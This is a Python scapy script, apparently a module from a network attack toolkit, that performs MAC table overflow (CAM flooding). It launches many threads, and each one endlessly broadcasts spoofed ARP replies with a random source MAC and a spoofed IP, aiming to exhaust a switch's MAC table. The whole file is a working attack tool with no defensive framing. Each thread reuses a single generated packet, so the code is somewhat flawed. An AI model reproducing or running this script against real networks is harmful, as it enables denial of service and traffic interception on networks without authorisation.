from scapy.all import *
from func.spoof_addr import spoof_addr
from func.random_mac import random_mac
from time import sleep
import threading

def mactableoverflow(THREAD_COUNT,quiet):
    all_threads=[]
    print("[+] Overflowing MAC table...")
    for i in range(int(THREAD_COUNT)):
        t = threading.Thread(target=__send_macs,args=(quiet,))
        t.daemon=True
        all_threads.append(t)

    for i in all_threads:
        i.start()
    
    all_threads[0].join()

def __send_macs(quiet):
    packet = Ether(src=random_mac(),dst='ff:ff:ff:ff:ff:ff')/ARP(op=2,psrc=spoof_addr(),hwdst='ff:ff:ff:ff:ff:ff')
    while True:
        send(packet,verbose=0)
        if not quiet:
            print("[+] Packet successfully sent\n[+] Packet: "+packet.summary())     
